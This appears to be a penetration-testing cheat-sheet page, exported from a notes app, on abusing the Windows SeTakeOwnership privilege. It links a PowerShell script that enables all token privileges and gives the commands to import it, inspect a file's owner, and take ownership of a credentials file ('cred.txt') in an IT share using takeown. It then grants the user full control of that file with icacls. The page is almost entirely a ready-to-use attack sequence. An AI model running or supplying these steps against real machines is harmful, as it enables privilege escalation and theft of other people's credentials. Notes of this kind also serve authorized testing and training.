# SeTakeOwnership Exploit

OS: Windows
Description: SeTakeOwnership Exploit
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### SeTakeOwnership Privilege

- PoC Script

```jsx
https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
```

- Import it

```jsx
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

- View ACL on object
- If owner is not shown it belongs to someone else

```jsx
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

### Check file ownership Windows

```jsx
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

### Take ownership of file

```jsx
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

### Grant all access/privs on file

```jsx
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant my_user:F
```